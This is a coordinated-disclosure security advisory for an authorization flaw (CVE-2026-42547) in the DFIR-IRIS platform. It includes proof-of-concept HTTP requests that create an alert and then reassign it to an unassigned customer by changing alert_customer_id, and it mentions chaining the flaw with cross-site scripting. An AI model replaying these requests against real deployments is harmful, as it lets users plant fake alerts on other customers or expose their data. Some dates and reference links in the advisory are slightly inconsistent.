# DFIR-IRIS Alerts Can be Falsely Attributed to Customers #

## Vulnerability Overview ##

Users can create alerts for customers that are not assigned to them.
This can be abused to falsely attribute fake alerts to customers.
In combination with Cross-Site Scripting, this can also be used to exfiltrate
alerts from other customers.

* **Identifier**            : SBA-ADV-20260128-05
* **Type of Vulnerability** : Alerts Can be Falsely Attributed to Customers
* **Software/Product Name** : [IRIS](https://www.dfir-iris.org/)
* **Vendor**                : [DFIR-IRIS](https://github.com/dfir-iris)
* **Affected Versions**     : <= 2.4.27
* **Fixed in Version**      : v2.4.28
* **CVE ID**                : CVE-2026-42547
* **CVSS Vector**           : CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N
* **CVSS Base Score**       : 5.4 (Medium)

## Vendor Description ##

> IRIS is a collaborative digital platform designed for incident response
> analysts to share complex investigations at a technical level. It can be
> installed on a dedicated server or as a portable application for roaming
> investigations where internet access might not be available.

Source: <https://docs.dfir-iris.org/2.4.24/>

## Impact ##

Attackers can falsely attribute fake alerts to customers that are not
assigned to them. In combination with Cross-Site Scripting, this can also be
used to exfiltrate alerts from customers that are not assigned to the
attackers.

## Vulnerability Description ##

Users have two requirements to successfully create new alerts: They must be
in a group with `alerts_write` privileges, and they need to have a particular
customer assigned. New alerts can then be created for assigned customers. The
same requirements hold for updating an alert, but the new properties are not
validated against security rules.

## Proof of Concept ##

In this example, the user is creating a new alert for a customer named “Test
Customer 1” with the customer ID 3, who is assigned to the user:

```http
POST /alerts/add HTTP/1.1
Host: myiris.local
Authorization: Bearer Ia4wMgyfDHlX3Tk1NJpBRkHU5sRUFMgmDFskX143vfZh1aRKJ7uuwijEcYsVuDAzZhxYB67Hjo0R2uK9gK-pbA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
Referer: https://myiris.local/alerts?cid=2&page=1&per_page=10&sort=desc
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Pwnfox-Color: pink
Priority: u=0, i
Te: trailers
Connection: keep-alive
Content-Length: 4286

{
  "alert_title": "This alert was submitted for Test Customer 1",
  "alert_description": "This is a test alert, courtesy of MS",
  "alert_source": "Source 1",
  "alert_source_ref": "Test-12345",
  […]
  "alert_customer_id": 3,
  "alert_classification_id": 1
}

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Jan 2026 09:33:42 GMT
Content-Type: application/json
Content-Length: 11226
Connection: keep-alive
Vary: Cookie
Set-Cookie: session=eyJwZXJtaXNzaW9ucyI6MzMzfQ.aXNAdg.rxVBEtIpn7JBpr_E-4ln78AyIL8; Secure; HttpOnly; Path=/; SameSite=Lax
Content-Security-Policy: default-src 'self' https://analytics.dfir-iris.org; script-src 'self' 'unsafe-inline' https://analytics.dfir-iris.org; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000: includeSubDomains
Front-End-Https: on

{"status": "success",
[…]
}
```

This is also properly reflected in the alerts overview of the user:

![Alert overview of the user](images/Authz_user_alert_overview_with_alert.png)

Existing alerts can be modified. This still requires the `alerts_write`
permission and the customer assignment. There is, however, no check for the
updated properties. As long as database constraints are upheld, e.g., not
re-using primary keys, any update is accepted.

In our scenario, the user, having only customer 3 assigned, updates the
previously created alert and sets the `alert_customer_id` to 4.

```http
POST /alerts/update/9 HTTP/1.1
Host: myiris.local
Authorization: Bearer Ia4wMgyfDHlX3Tk1NJpBRkHU5sRUFMgmDFskX143vfZh1aRKJ7uuwijEcYsVuDAzZhxYB67Hjo0R2uK9gK-pbA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json;charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Origin: https://myiris.local
Referer: https://myiris.local/alerts?cid=2&page=1&per_page=10&sort=desc
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: pink
Priority: u=0
Te: trailers
Connection: keep-alive

{"alert_customer_id":4}

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 27 Jan 2026 09:46:18 GMT
Content-Type: application/json
Content-Length: 11664
Connection: keep-alive
Vary: Cookie
Set-Cookie: session=eyJwZXJtaXNzaW9ucyI6MzMzfQ.aXNDag.Wp7bYXWmy-MfWMraEtaLQUDmjoE; Secure; HttpOnly; Path=/; SameSite=Lax
Content-Security-Policy: default-src 'self' https://analytics.dfir-iris.org; script-src 'self' 'unsafe-inline' https://analytics.dfir-iris.org; style-src 'self' 'unsafe-inline'; img-src 'self' data:;
X-XSS-Protection: 1; mode=block
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000: includeSubDomains
Front-End-Https: on

{"status": "success",
[…]
}
```

After the change, the alert is no longer available to the user:

![Alert overview without the previously created alert](images/Authz_user_alert_overview_without_alert.png)

The alert can also no longer be modified by this particular user as they
don’t have the new customer assigned. We can see the newly assigned alert in
the alerts overview of the admin user:

![Alert overview of the admin, with the newly assigned alert](images/Authz_admin_alert_overview_with_alert.png)

This can also work the other way round. By utilizing Cross-Site Scripting
attacks, an attacker could manipulate other users with `alerts_write`
privileges to re-assign alerts to customers the attacker has control over.

## Recommended Countermeasures ##

We recommend updating to IRIS version 2.4.28 or later.

We suggest two mitigations: First, the alert update API should only accept
properties that can also be changed in the web interface. The web UI offers
only changes to a limited set of properties, and notably does not include the
option to re-assign the customer.

Second, security-relevant properties need to be checked during the update. If
the change breaks rules, e.g., no access to the alert after changing the
customer ID, the update should fail.

## Timeline ##

* `2026-01-28` Identified the vulnerability in version 2.4.26
* `2026-01-30` Initial vendor contact via e-mail
* `2026-02-27` Second vendor contact via e-mail
* `2026-03-30` Report on GitHub due to a missing response from the vendor
* `2026-04-27` Version containing fix (v2.4.28) tagged by vendor
* `2026-04-28` GitHub assigned CVE-2026-42547
* `2026-05-04` Confirm fix for v2.4.28
* `2026-05-19` Public disclosure

## References ##

* OWASP Cheat Sheet Series. Authorization Cheat Sheet:
  <https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html>
* OWASP Application Security Verification Standard (ASVS) v5.0.0. Section V8
  Authorization:
  <https://raw.githubusercontent.com/OWASP/ASVS/v5.0.0/5.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf>
* Common Weakness Enumeration. CWE-863 Incorrect Authorization:
  <https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html>

## Credits ##

* Michael Koppmann ([SBA Research](https://www.sba-research.org/))
* Mathias Tausig ([SBA Research](https://www.sba-research.org/))

The discovery of this vulnerability was made possible through support from
[CYSSDE](https://cyssde.eu/) and the European Union.

![CYSSDE](images/cyssde.png)
